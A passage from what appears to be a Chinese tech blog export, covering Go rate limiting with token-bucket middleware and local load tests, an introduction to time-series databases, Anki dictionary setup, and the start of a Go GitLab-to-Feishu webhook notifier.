(\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tr := l.ReserveN(time.Now(), 1)\n\t\ts := r.Delay()\n\t\ttime.Sleep(s)\n\t\tfmt.Println(s, time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n\n0s 2023-09-11 17:10:47\n0s 2023-09-11 17:10:47\n0s 2023-09-11 17:10:47\n999.811042ms 2023-09-11 17:10:48\n999.675375ms 2023-09-11 17:10:49\n998.794834ms 2023-09-11 17:10:50\n998.750334ms 2023-09-11 17:10:51\n998.832875ms 2023-09-11 17:10:52\n```\n\n\n\n# 3. golang限流实现\n\n### 3.1 实现方案\n\n1. uber 开源库中基于漏桶算法实现了一个限流器。漏桶算法可以限制流量的请求速度，并起到削峰填谷的作用。 `https://github.com/uber-go/ratelimit`\n2. 滴滴开源实现了一个对http请求的限流器中间件。可以基于以下模式限流。\n   - 基于IP，路径，方法，header，授权用户等限流\n   - 通过自定义方法限流\n   - 还支持基于 http header 设置限流数据\n   - 实现方式是基于 `github/go/time` 实现的，不同类别的数据都存储在一个带超时时间的数据池中。\n   - 代码地址 `https://github.com/didip/tollbooth`\n3. golang 网络包中还有基于信号量实现的限流器。 `https://github.com/golang/net/blob/master/netutil/listen.go` 也值得我们去学习下。\n\n### 3.2 http 令牌桶限流\n\n```go\nfunc main() {\n\tlimiter := rate.NewLimiter(rate.Every(100*time.Millisecond), 3) // 最多3个令牌，1秒放10个\n\thttp.HandleFunc(\"/ping\", func(w http.ResponseWriter, r *http.Request) {\n\t\tif limiter.Allow() { // do something\n\t\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"), \"say hello\")\n\t\t} else {\n\t\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"), \"limit\")\n\t\t}\n\t})\n\n\tgo func() {\n\t\tfor {\n\t\t\ttime.Sleep(time.Second)\n\t\t\tReq()\n\t\t}\n\t}()\n\n\t_ = http.ListenAndServe(\":13100\", nil)\n}\n\nfunc Req() {\n\t// 1秒请求10次\n\tfor i := 0; i < 10; i++ {\n\t\t_, _ = resty.New().R().Get(\"http://localhost:13100/ping\")\n\t}\n}\n\n\n\n/*\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n*/\n```\n\n+ 如果1秒放10个，最多存10个。那么每一秒可以打印10个sayhello。\n+ 如果1秒放1个，最多存10个。第一次10个sayhello，后面每一秒一个sayhello。\n\n### 3.3 Gin 中间件限流\n\n```go\npackage main\n\nimport (\n\t\"time\"\n\n\t\"github.com/didip/tollbooth\"\n\t\"github.com/didip/tollbooth/limiter\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.New()\n\n\tlmt := tollbooth.NewLimiter(1, &limiter.ExpirableOptions{DefaultExpirationTTL: time.Second * 5})\n\tlmt.SetIPLookups([]string{\"RemoteAddr\", \"X-Forwarded-For\", \"X-Real-IP\"})\n\tlmt.SetMethods([]string{\"POST\", \"GET\"}) //放开更精准限制，但是也放松了流量。\n\n\tr.Use(LimitHandler(lmt))\n\tr.GET(\"/\", func(c *gin.Context) {\n\t\tc.String(200, \"Get Hello, world!\")\n\t})\n\tr.POST(\"/\", func(c *gin.Context) {\n\t\tc.String(200, \"Post Hello, world!\")\n\t})\n\tr.Run(\":12345\")\n}\n\nfunc LimitHandler(lmt *limiter.Limiter) gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\thttpError := tollbooth.LimitByRequest(lmt, c.Writer, c.Request)\n\t\tif httpError != nil {\n\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\tc.Abort()\n\t\t} else {\n\t\t\tc.Next()\n\t\t}\n\t}\n}\n```\n\n\n\n##### 根据 IP 和 ReqPath 等配置限流\n\n```go\n//\"github.com/didip/tollbooth\"\n//\"github.com/didip/tollbooth/errors\"\n// github.com/didip/tollbooth/limiter\"\n\nlmt := tollbooth.NewLimiter(10, &limiter.ExpirableOptions{ // 每秒 10 个请求\n\t\tDefaultExpirationTTL: time.Hour * 24, // token过期的时间，放在cache里，可以节省内存\n})\n\nfunc wrapGinLimitHandler(lmt *limiter.Limiter) gin.HandlerFunc {\n  limitOptions := []string{\"ip\",\"token\",\"device\",\"version\",\"platform\",\"lang\"}\n\tallowPathList := configure.Global.HttpConfig.AllowPathList\n\tdenyPathList := configure.Global.HttpConfig.DenyPathList\n\treturn func(c *gin.Context) {\n\t\tpath := c.Request.URL.Path\n\t\t// allow and deny path list config\n\t\tfor _, v := range allowPathList {\n\t\t\tif strings.Contains(path, v) {\n\t\t\t\tc.Next()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tfor _, v := range denyPathList {\n\t\t\tif path == v {\n\t\t\t\thttpError := &errors.HTTPError{Message: lmt.GetMessage(), StatusCode: lmt.GetStatusCode()}\n\t\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\t\tc.Abort()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\t// get remote ip\n\t\tremoteIP := c.Request.Header.Get(\"X-Real-IP\")\n\t\tif remoteIP == \"\" {\n\t\t\tremoteIP = c.ClientIP()\n\t\t}\n\t\t// filter ips\n\t\tif remoteIP == \"127.0.0.1\" || remoteIP == \"localhost\" {\n\t\t\tc.Next()\n\t\t\treturn\n\t\t}\n\n\t\t// get limit keys\n\t\tvar keys []string\n\t\tfor _, v := range limitOptions {\n\t\t\tif strings.Contains(v, \"ip\") {\n\t\t\t\tkeys = append(keys, remoteIP)\n\t\t\t} else if strings.Contains(v, \"token\") {\n\t\t\t\ttoken := c.GetHeader(\"Token\")\n\t\t\t\tif token == \"\" {\n\t\t\t\t\ttoken = c.GetHeader(\"Access-Token\")\n\t\t\t\t}\n\t\t\t\tkeys = append(keys, token)\n\t\t\t} else if strings.Contains(v, \"device\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Device-Id\"))\n\t\t\t} else if strings.Contains(v, \"version\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Appversion\"))\n\t\t\t} else if strings.Contains(v, \"platform\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Platform\"))\n\t\t\t} else if strings.Contains(v, \"lang\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Lang\"))\n\t\t\t}\n\t\t}\n\t\t// if null default ip\n\t\tif len(keys) == 0 {\n\t\t\tkeys = append(keys, remoteIP)\n\t\t}\n\t\t// keys included path\n\t\tkeys = append(keys, path)\n\n\t\t// limit by keys\n\t\thttpError := tollbooth.LimitByKeys(lmt, keys)\n\t\tif httpError != nil {\n\t\t\tstrKeys := path\n\t\t\tlqlog.WarnCtx(c.Request.Context(), \"[wrapGinLimitHandler] keys: (%v)\", strKeys)\n\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\tif _, ok := LimitKeysMap.Load(strKeys); ok {\n\t\t\t\t// nothing\n\t\t\t} else {\n\t\t\t\tLimitKeysMap.Store(strKeys, \"1\")\n\t\t\t\ttext := fmt.Sprintf(`\"%s %s\" trigger http limit,  keys:%+v`, c.Request.Method, path, keys)\n\t\t\t\ttext += fmt.Sprintf(\"\\nAppversion: %v\", c.GetHeader(\"Appversion\"))\n\t\t\t\ttext += fmt.Sprintf(\"\\nPlatform: %v\", c.GetHeader(\"Platform\"))\n\t\t\t\tFeishuAlarmText(c, text)\n\t\t\t}\n\t\t\tc.Abort()\n\t\t} else {\n\t\t\tc.Next()\n\t\t}\n\t}\n}\n\n```\n\n##### 根据 IP Redis全局限流\n\n```go\n// ratelimit \"github.com/JGLTechnologies/gin-rate-limit\"\nrequest.POST(\"/create_info\", middleware.LimitIPRate(time.Hour*6, 3), handler.AddUserInfo)\n\n\nfunc LimitIPRate(rate time.Duration, limit uint) gin.HandlerFunc {\n\tif !configure.Global.HttpConfig.IPRateLimit {\n\t\treturn func(c *gin.Context) { c.Next() }\n\t}\n\n\t// 本地测试需要关闭\n\tskipFunc := func(c *gin.Context) bool {\n\t\tremoteIP := GetGinClientIP(c)\n    if remoteIP == \"127.0.0.1\" || remoteIP == \"localhost\" {\n\t\t\treturn true\n\t\t}\n\t\treturn false\n\t}\n\n\t// 内存限制\n\t//store := ratelimit.InMemoryStore(&ratelimit.InMemoryOptions{Rate: rate, Limit: limit, Skip: skipFunc})\n\t// Redis限制\n\tstore := ratelimit.RedisStore(&ratelimit.RedisOptions{RedisClient: dao.LimitRedisClient, Rate: rate, Limit: limit, Skip: skipFunc})\n\n\tmw := ratelimit.RateLimiter(store, &ratelimit.Options{\n\t\tErrorHandler: func(c *gin.Context, info ratelimit.Info) {\n\t\t\tc.String(429, \"Too many requests. Try again in \"+time.Until(info.ResetTime).String())\n\t\t\tkey := \"LimitIPRate\" + c.ClientIP() + c.FullPath()\n\t\t\tif _, ok := LimitKeysMap.Load(key); !ok {\n\t\t\t\tLimitKeysMap.Store(key, \"1\")\n\t\t\t\ttext := fmt.Sprintf(`\"%s %s\" trigger ipRate limit`, c.Request.Method, key)\n\t\t\t\ttext += fmt.Sprintf(\"\\nAppversion: %v\", c.GetHeader(\"Appversion\"))\n\t\t\t\ttext += fmt.Sprintf(\"\\nPlatform: %v\", c.GetHeader(\"Platform\"))\n\t\t\t\tlqlog.WarnCtx(c, text)\n\t\t\t}\n\t\t},\n\t\tKeyFunc: func(c *gin.Context) string {\n\t\t\treturn \"LimitIPRate:\" + GetGinClientIP(c)\n\t\t},\n\t})\n\treturn mw\n}\n\nfunc GetGinClientIP(c *gin.Context) string {\n\tremoteIP := c.Request.Header.Get(\"X-Real-IP\")\n\tif remoteIP == \"\" {\n\t\tremoteIP = c.ClientIP()\n\t}\n\treturn remoteIP\n}\n\n```\n\n### 3.4 vegeta测试\n\n\n有一个非常棒的工具称作 vegeta，我喜欢在 HTTP 负载测试中使用（它也是用 Go 编写的）。\n\n```bash\nbrew install vegeta\n```\n\n我们需要创建一个简单的配置文件，声明我们想要发送的请求。\n\n```\nGET http://localhost:12345/\n```\n\n然后，以每个时间单元 100 个请求的速率攻击 10 秒。\n\n```bash\nvegeta attack -duration=10s -rate=100 -targets=vegeta.conf | vegeta report\n\necho \"http://localhost:12345\" | vegeta attack -rate=500 -connections=100 -duration=10s | tee results.bin | vegeta report\n\n\n// vegeta attack -duration=10s -rate=100 -targets=vegeta.conf | vegeta report      1s只成功了一个\n// Status Codes  [code:count]                      200:10  429:990\n```\n\n结果，你将看到一些请求返回 200，但大多数返回 429。\n\n### 3.5 wrk测试\n\n先在本地安装wrk。\n\n```bash\ngit clone https://github.com/wg/wrk\ncd wrk\nmake\nln -s $PWD/wrk /usr/local/bin/\n```\n\n我的mac是6核，线程数不要太多，是核数的 2 到 4 倍即可。\n\n```bash\nwrk -t6 -c10 -d10s  --latency http://127.0.0.1:9061/health\n\n\nRunning 10s test @ http://127.0.0.1:9061/health\n  6 threads and 10 connections\n  Thread Stats   Avg      Stdev     Max   +/- Stdev\n    Latency     1.28ms   14.43ms 399.37ms   99.59%\n    Req/Sec     2.06k   262.21     2.72k    84.25%\n  Latency Distribution\n     50%  448.00us\n     75%  620.00us\n     90%  797.00us\n     99%    1.38ms\n  123958 requests in 10.10s, 20.21MB read\n  Non-2xx or 3xx responses: 123847\nRequests/sec:  12270.53\nTransfer/sec:      2.00MB\n\n# 限流后，可以看到，一共123958个， 失败了 123847 个\n```\n\n\n\n# 4. 参考资料\n\n+ https://learnku.com/articles/57900\n+ https://studygolang.com/articles/33988\n","tags":["golang"],"categories":["4_golang实战"]},{"title":"时序数据库简介","url":"%2Fp%2F27b2e776.html","content":"\n\n\n# 1. 时间序列数据库 Time Series Database (TSDB)\n\n随着分布式系统监控、物联网的发展，TSDB开始受到更多的关注。\n\n时间序列数据跟关系型数据库有太多不同，但是很多公司并不想放弃关系型数据库。 于是就产生了一些特殊的用法，比如用 MySQL 的 VividCortex, 用 Postgres 的 Timescale。 很多人觉得特殊的问题需要特殊的解决方法，于是很多时间序列数据库从头写起，不依赖任何现有的数据库, 比如 Graphite，InfluxDB。\n\n<!-- more -->\n\n### 1.1 时序概念\n\n时序数据是基于时间的一系列的数据。在有时间的坐标中将这些数据点连成线，往过去看可以做成多纬度报表，揭示其趋势性、规律性、异常性；往未来看可以做大数据分析，机器学习，实现预测和预警。\n\n时序数据库就是存放时序数据的数据库，并且需要支持时序数据的快速写入、持久化、多纬度的聚合查询等基本功能。\n\n### 1.2 数据写入特点\n\n+ 写入平稳、持续、高并发高吞吐\n\n  时序数据的写入是比较平稳的，这点与应用数据不同，应用数据通常与应用的访问量成正比，而应用的访问量通常存在波峰波谷。时序数据的产生通常是以一个固定的时间频率产生，不会受其他因素的制约，其数据生成的速度是相对比较平稳的。\n\n  \n\n+ 写多读少\n\n  时序数据上95%-99%的操作都是写操作，是典型的写多读少的数据。这与其数据特性相关，例如监控数据，你的监控项可能很多，但是你真正去读的可能比较少，通常只会关心几个特定的关键指标或者在特定的场景下才会去读数据。\n\n  \n\n+ 实时写入最近生成的数据，无更新\n\n  时序数据的写入是实时的，且每次写入都是最近生成的数据，这与其数据生成的特点相关，因为其数据生成是随着时间推进的，而新生成的数据会实时的进行写入。数据写入无更新，在时间这个维度上，随着时间的推进，每次数据都是新数据，不会存在旧数据的更新，不过不排除人为的对数据做订正。\n\n\n\n### 1.3 数据查询和分析特点\n\n- 按时间范围读取：通常来说，你不会去关心某个特定点的数据，而是一段时间的数据。\n- 最近的数据被读取的概率高\n- 历史数据粗粒度查询的概率搞\n- 多种精度查询\n- 多维度分析\n\n\n\n### 1.4  数据存储的特点\n\n- 数据量大：拿监控数据来举例，如果我们采集的监控数据的时间间隔是1s，那一个监控项每天会产生86400个数据点，若有10000个监控项，则一天就会产生864000000个数据点。在物联网场景下，这个数字会更大。整个数据的规模，是TB甚至是PB级的。\n- 冷热分明：时序数据有非常典型的冷热特征，越是历史的数据，被查询和分析的概率越低。\n- 具有时效性：时序数据具有时效性，数据通常会有一个保存周期，超过这个保存周期的数据可以认为是失效的，可以被回收。一方面是因为越是历史的数据，可利用的价值越低；另一方面是为了节省存储成本，低价值的数据可以被清理。\n- 多精度数据存储：在查询的特点里提到时序数据出于存储成本和查询效率的考虑，会需要一个多精度的查询，同样也需要一个多精度数据的存储。\n\n\n\n# 2. 数据\n\n### 2.1 数据模型\n\n时间序列数据可以分成两部分\n\n- 序列 ：就是标识符（维度），主要的目的是方便进行搜索和筛选\n\n- 数据点：时间戳和数值构成的数组\n\n  行存：一个数组包含多个点，如 [{t: 2017-09-03-21:24:44, v: 0.1002}, {t: 2017-09-03-21:24:45, v: 0.1012}]\n\n  列存：两个数组，一个存时间戳，一个存数值，如[ 2017-09-03-21:24:44, 2017-09-03-21:24:45], [0.1002,  0.1012]\n   *一般情况下：列存能有更好的压缩率和查询性能*\n\n### 2.2 基本概念\n\n- metric: 度量，相当于关系型数据库中的table。\n- data point: 数据点，相当于关系型数据库中的row。\n- timestamp：时间戳，代表数据点产生的时间。\n- field: 度量下的不同字段。比如位置这个度量具有经度和纬度两个field。一般情况下存放的是会随着时间戳的变化而变化的数据。\n- tag: 标签，或者附加信息。一般存放的是并不随着时间戳变化的属性信息。timestamp加上所有的tags可以认为是table的primary key。\n\n如下图，度量为Wind，每一个数据点都具有一个timestamp，两个field：direction和speed，两个tag：sensor、city。它的第一行和第三行，存放的都是sensor号码为95D8-7913的设备，属性城市是上海。随着时间的变化，风向和风速都发生了改变，风向从23.4变成23.2；而风速从3.4变成了3.3。\n\n![1](%E6%97%B6%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B/1.png)\n\n\n# 3. 开源时间序列数据库\n\n### 3.1 时间线\n\n- 1999/07/16 [RRDTool First release](http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/RRDtool)\n- 2009/12/30 [Graphite 0.9.5](http://link.zhihu.com/?target=https%3A//github.com/graphite-project/graphite-web/releases/tag/0.9.5)\n- 2011/12/23 [OpenTSDB 1.0.0](http://link.zhihu.com/?target=https%3A//github.com/OpenTSDB/opentsdb/releases/tag/v1.0.0)\n- 2013/05/24 [KairosDB 1.0.0-beta](http://link.zhihu.com/?target=https%3A//github.com/kairosdb/kairosdb/releases/tag/v1.0.0-beta2a)\n- 2013/10/24 [InfluxDB 0.0.1](http://link.zhihu.com/?target=https%3A//github.com/influxdata/influxdb/releases/tag/v0.0.1)\n- 2014/08/25 [Heroic 0.3.0](http://link.zhihu.com/?target=https%3A//github.com/spotify/heroic/releases/tag/0.3.0)\n- 2017/03/27 [TimescaleDB 0.0.1-beta](http://link.zhihu.com/?target=https%3A//github.com/timescale/timescaledb/releases/tag/0.0.1-beta)\n\n\n\n[RRDTool](http://link.zhihu.com/?target=https%3A//oss.oetiker.ch/rrdtool/) 是最早的时间序列数据库，它自带画图功能，现在大部分时间序列数据库都使用[Grafana](http://link.zhihu.com/?target=https%3A//github.com/grafana/grafana)来画图。\n\n[Graphite](http://link.zhihu.com/?target=https%3A//graphiteapp.org/) 是用 Python 写的 RRD 数据库，它的存储引擎 [Whisper](http://link.zhihu.com/?target=https%3A//github.com/graphite-project/whisper) 也是 Python 写的， 它画图和聚合能力都强了很多，但是很难水平扩展。\n [OpenTSDB](http://link.zhihu.com/?target=http%3A//opentsdb.net/) 使用 HBase 解决了水平扩展的问题\n [KairosDB](http://link.zhihu.com/?target=https%3A//kairosdb.github.io/) 最初是基于OpenTSDB修改的，但是作者认为兼容HBase导致他们不能使用很多 Cassandra 独有的特性， 于是就抛弃了HBase仅支持Cassandra。\n [新发布的](http://link.zhihu.com/?target=http%3A//opentsdb.net/docs/build/html/new.html) OpenTSDB 中也加入了对 Cassandra 的支持。 故事还没完，Spotify 的人本来想使用 KairosDB，但是觉得[项目发展方向不对以及性能太差](http://link.zhihu.com/?target=http%3A//blog.dongyueweb.com/(https%3A//labs.spotify.com/2015/11/16/monitoring-at-spotify-the-story-so-far/))，就自己撸了一个 [Heroic](http://link.zhihu.com/?target=https%3A//github.com/spotify/heroic)。\n\n[InfluxDB](http://link.zhihu.com/?target=https%3A//github.com/influxdata/influxdb) 早期是完全开源的，后来为了维持公司运营，闭源了集群版本。 在 Percona Live 上他们做了一个[开源数据库商业模型正面临危机](http://link.zhihu.com/?target=https%3A//www.youtube.com/watch%3Fv%3DKvf5jWZjw0U)的演讲，里面调侃红帽的段子很不错。 并且今年的 Percona Live 还有专门的[时间序列数据库单元](http://link.zhihu.com/?target=https%3A//www.percona.com/live/17/program/schedule/time-series)。\n\n### 3.2 目前排名\n\nhttps://db-engines.com/en/ranking/time+series+dbms \n\n![1](%E6%97%B6%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B/2.png)\n\n\n\n# 4. InfluxDB\n\nInfluxDB 就是一款非常优秀的时序数据库，高居 DB-Engines TSDB rank 榜首。InfluxDB 分为免费的社区开源版本，以及需要收费的闭源商业版本，目前只有商业版本支持集群。\n\nInfluxDB 的底层数据结构从 LSM 树到 B+ 树折腾了一通，最后自创了一个 TSM 树（ Time-Structured Merge Tree ），这也是它性能高且资源占用少的重要原因。\n\nTime Structured Merge Tree (TSM) 和 Log Structured Merge Tree (LSM) 的名字都有点误导性，关键并不是树，也不是日志或者时间，而是 Merge。\n\n\n\n- 写入的时候，数据先写入到内存里，之后批量写入到硬盘。\n- 读的时候，同时读内存和硬盘然后合并结果。\n- 删除的时候，写入一个删除标记，被标记的数据在读取时不会被返回。\n- 后台会把小的块合并成大的块，此时被标记删除的数据才真正被删除\n- 相对于普通数据，有规律的时间序列数据在合并的过程中可以极大的提高压缩比。\n\n\n\n# 5. 参考资料\n\n+ https://www.jianshu.com/p/31afb8492eff\n+ https://cloud.tencent.com/developer/article/1115643","tags":["sql"],"categories":["数据库"]},{"title":"anki最好用的mdx词典组合","url":"%2Fp%2Ff1d70253.html","content":"\n用FastWQ，一直都是在线请求字段，速度很慢，并且容易被Ban IP。后来了解了本地mdx词典，发现效果更好，速度更快，更有各位大神制作的精美词典。\n\n入门教程\n\n+ https://www.liuvv.com/p/9200c91e.html anki记忆神器的使用\n\n+ https://www.liuvv.com/p/a2ff337b.html  anki之英语单词篇\n\n<!-- more -->\n\n# 1. 词典选择\n\n目前英系词典占据中国市场的主导地位，著名的品牌如牛津、朗文、剑桥、麦克米伦、柯林斯，简称“牛朗剑麦柯”（谐音“牛郎见迈克”）合称“英国五虎”。美系词典主要有《美国传统词典》（*The American Heritage Dictionary*）和“韦氏词典”两大品牌。\n\n我Anki主要选了以下五个词典（Vocabulary，柯林斯，The Little Dict，牛津，朗文）。以英语第一个单词 abandon 举例。\n\n### 1.1 Vocabulary\n\n​\t可以快速了解单词的意思。用英文解释英文，用英文理解英文，用英文对世界编码，有利于养成英语思维，对听说读写都有帮助。全英文解释，不会因为英汉差别而导致理解上的偏差。\n\n<img src=\"anki最好用的mdx词典组合/image-20220123210444197-4413554.png\" alt=\"image-20220123210444197\" style=\"zoom:50%;\" />\n\n### 1.2 柯林斯\n\n​\t可以看到单词的星级，一般和单词频率有关。另外可以看到单词的几种意思，可以直接背诵单词及短语的整句释义，这就好比一个外国人在跟你交谈，对英语思维以及口语表达都有莫大的帮助。\n\n<img src=\"anki最好用的mdx词典组合/image-20220123210557163-4413554.png\" alt=\"image-20220123210557163\" style=\"zoom:50%;\" />\n\n### 1.3 The Little Dict\n\n​\t显示一个的单词的频率，排名等。并且还有单词的百分比解释，非常Nice。硬核之作，真香推荐，居家旅行沉迷学习必备，建议日常置顶食用。\n\n​\thttps://www.pdawiki.com/forum/forum.php?mod=viewthread&tid=30146\n\n<img src=\"anki最好用的mdx词典组合/image-20220123210754049-4413554.png\" alt=\"image-20220123210754049\" style=\"zoom:50%;\" />\n\n### 1.4 牛津\n\n​\t牛津高阶英语词典为世所公认的权威英语学习词典，惠及世界各地一代又一代学子。有发音和配图，和更详细专业的一些解释。\n\n<img src=\"anki最好用的mdx词典组合/image-20220123210912008-4413554.png\" alt=\"image-20220123210912008\" style=\"zoom:50%;\" />\n\n### 1.5 朗文\n\n​\t主打语音，例句是真人原声，非常自然。\n\n<img src=\"anki最好用的mdx词典组合/image-20220123211032679-4413554.png\" alt=\"image-20220123211032679\" style=\"zoom:50%;\" />\n\n# 2. FastWQ设置\n\n### 2.1 词典配置\n\n菜单栏-> 工具 -> FastWQ ->  Dictionary Folder\n\n<img src=\"anki最好用的mdx词典组合/image-20220123204138441-4413554.png\" alt=\"image-20220123204138441\" style=\"zoom:50%;\" />\n\n​\t本地词典需要通过 + 号，添加进来。不过FastWQ支持定制的的朗文6词典，只需要改下`LDOCE6.py`内部的源代码，修改一下路径即可。\n\n​\t<img src=\"anki最好用的mdx词典组合/image-20220123204525720-4413554.png\" alt=\"image-20220123204525720\" style=\"zoom:50%;\" />\n\n### 2.2 字段选择\n\n​\t加载词典后，Fields默认是Default选项。但是朗文6可以支持一些Fields选择(FastWQ作者写了python脚本支持)。\n\n<img src=\"anki最好用的mdx词典组合/image-20220123204709610-4413554.png\" alt=\"image-20220123204709610\" style=\"zoom: 50%;\" />\n\n\n\n# 3. Anki效果图\n\n正面是  Vocabulary + 柯林斯。学习单词先从Vocabulary的英语解释开始看起，然后在看柯林斯的解释。\n\n背面是   The Little Dict + 牛津8 + 朗文6。大概了解单词频率和排行，然后在看一些特殊用法和原句中的发音。\n\n### 3.1 正面预览\n\n<img src=\"anki最好用的mdx词典组合/image-20220123205510533-4413554.png\" alt=\"image-20220123205510533\" style=\"zoom:33%;\" />\n\n### 3.2 背面预览\n\n<img src=\"anki最好用的mdx词典组合/image-20220123205554799-4413554.png\" alt=\"image-20220123205554799\" style=\"zoom:33%;\" />\n\n\n\n# 4. 参考资料\n\n+ 下载mdx https://downloads.freemdict.com/Recommend/\n\n+ goldendict介绍(包含英语词典推荐) https://www.cnblogs.com/keatonlao/p/12702571.html\n\n+ 最好用的词典组合 https://ld246.com/article/1603388576222\n\n+ 欧路词典竟然可以这么好看！ https://zhuanlan.zhihu.com/p/190186097\n\n+ 欧路词典词库分享  https://zhuanlan.zhihu.com/p/210324976\n\n+ 如何给FastWordQuery写扩展插件以支持其他mdx词典  https://www.pdawiki.com/forum/forum.php?mod=viewthread&tid=39707&extra=page%3D1\n\n+ https://forum.freemdict.com/t/topic/6755/34\n\n+ https://www.pdawiki.com/forum/thread-35395-1-1.html\n\n+ 英语生词学习解决方案（欧路/GoldenDict+Anki）https://www.yuque.com/purequant/anki/bczop2\n+ 我的英语学习经验 - 词典 https://forum.freemdict.com/t/topic/5967\n+ 介绍几份很有价值的牛津词表 https://zhuanlan.zhihu.com/p/75513302\n+ Anki 学习指南（优质资源 & 教程总结） https://www.yuque.com/purequant/anki/swnp53","tags":["anki"],"categories":["使用软件"]},{"title":"gitlab提交MR通知飞书的golang代码实现","url":"%2Fp%2F25e9ea9.html","content":"\n公司团队是使用`gitlab`来管理源代码的，一直以来当提交了一个`MR`后，需要手动在内部`IM`群里贴出`PR`链接和摘要，然后`@`目标同事来帮忙review代码，其实大部分流程是可以自动化的。\n\n<!-- more -->\n\n# 1. 设置\n\n### 1.1 gitlab\n\ngitlab admin 用户可以在所有项目设置， webhooks, 填写地址。\n\n![1](gitlab提交MR通知到飞书/1.png)\n\n### 1.2 飞书\n\n飞书群组创建普通机器人即可，复制出来webhook url地址\n\n![1](gitlab提交MR通知到飞书/2.png)\n\n\n\n# 2. golang实现\n\n> hook.go\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n\t\"time\"\n)\n\nconst (\n\t// https://open.feishu.cn/tool/cardbuilder?from=custom_bot_doc\n\tMRTemplate = `{\"config\":{\"wide_screen_mode\":true},\"header\":{\"template\":\"blue\",\"title\":{\"content\":\"{{__project__}} 👉  {{__branch__}}\",\"tag\":\"plain_text\"}},\"i18n_elements\":{\"zh_cn\":[{\"fields\":[{\"is_short\":false,\"text\":{\"content\":\"**时间：**{{__time__}}\\n\\n**地址：**[{{__url__}}]({{__url__}})\\n\\n**提交人：**{{__name__}}\\n\\n**提交消息：**{{__title__}}\\n{{__desc__}}\",\"tag\":\"lark_md\"}}],\"tag\":\"div\"},{\"tag\":\"hr\"}]}}`\n)\n\ntype MrContext struct {\n\tProject      string `json:\"project\"`\n\tSourceBranch string `json:\"source_branch\"`\n\tUrl          string `json:\"url\"`\n\tTitle        string `json:\"title\"`\n\tDesc         string `json:\"desc\"`\n\tTime         string `json:\"time\"`\n\tName         string `json:\"name\"`\n}\n\nfunc ExecHook(body string, hookUrl string) {\n\tlog.Println(\"body:\", body)\n\n\tvar v map[string]interface{}\n\tif err := json.Unmarshal([]byte(body), &v); err != nil {\n\t\tlog.Println(\"json Unmarshal err:\", err)\n\t\treturn\n\t}\n\n\tet, _ := v[\"event_type\"].(string)\n\tif et != \"merge_request\" {\n\t\tlog.Println(\"event_type not merge_request:\", et, v[\"event_type\"])\n\t\treturn\n\t}\n\n\tmc := MrContext{}\n\n\tif project, ok := v[\"project\"].(map[string]interface{}); ok {\n\t\tif name, ok := project[\"name\"].(string); ok {\n\t\t\tmc.Project = name\n\t\t}\n\t}\n\n\tif object_attributes, ok := v[\"object_attributes\"].(map[string]interface{}); ok {\n\t\tstate, _ := object_attributes[\"state\"].(string)\n\t\taction, _ := object_attributes[\"action\"].(string)\n\t\tif state == \"opened\" && action == \"open\" {\n\t\t\t// 新开的分支继续往下走\n\t\t} else {\n\t\t\tlog.Println(\"fail: state\", state, \"action\", action)\n\t\t\treturn\n\t\t}\n\n\t\tif source_branch, ok := object_attributes[\"source_branch\"].(string); ok {\n\t\t\tmc.SourceBranch = source_branch\n\t\t}\n\t\tif title, ok := object_attributes[\"title\"].(string); ok {\n\t\t\tmc.Title = title\n\t\t}\n\t\tif description, ok := object_attributes[\"description\"].(string); ok {\n\t\t\tmc.Desc = description\n\t\t}\n\n\t\tif update, ok := object_attributes[\"updated_at\"].(string); ok {\n\t\t\tt, _ := time.Parse(\"2006-01-02 15:04:05 MST\", update)\n\t\t\tl, _ := time.LoadLocation(\"Asia/Shanghai\")\n\t\t\tmc.Time = t.In(l).Format(\"2006-01-02 15:04:05\")\n\t\t}\n\t\tif url, ok := object_attributes[\"url\"].(string); ok {\n\t\t\tmc.Url = url\n\t\t}\n\t}\n\n\tif user, ok := v[\"user\"].(map[string]interface{}); ok {\n\t\tif name, ok := user[\"name\"].(string); ok {\n\t\t\tmc.Name = name\n\t\t}\n\t}\n\n\t_, err := http.Post(hookUrl, \"application/json\", 